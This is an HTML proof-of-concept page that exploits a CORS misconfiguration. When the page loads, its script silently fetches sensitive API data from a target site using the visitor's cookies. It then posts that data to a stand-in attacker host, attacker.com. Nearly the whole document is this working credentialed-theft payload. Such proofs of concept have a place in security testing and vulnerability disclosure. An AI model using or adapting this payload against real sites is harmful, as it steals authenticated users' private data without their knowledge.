<!DOCTYPE html> 
<html>
<head>
    <title>PoC CORS Attack</title>
</head>
<body>
    <h1>PoC: Exploiting CORS Misconfiguration</h1>
    <script>
        async function fetchSensitiveData() {
            try {
                const response = await fetch('https://vulnerableapp.com/api/sensitive-data', {
                    method: 'GET',
                    credentials: 'include' // Send cookies along with the request
                }); // new

                if (response.ok) {
                    const data = await response.json();
                    console.log("Fetched Data:", data);

                    await fetch('https://attacker.com/log', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ stolenData: data })
                    });
                } else {
                    console.log("Failed to fetch data:", response.status);
                }
            } catch (error) {
                console.error("Error:", error);
            }
        }

        fetchSensitiveData();
    </script>
</body>
</html>
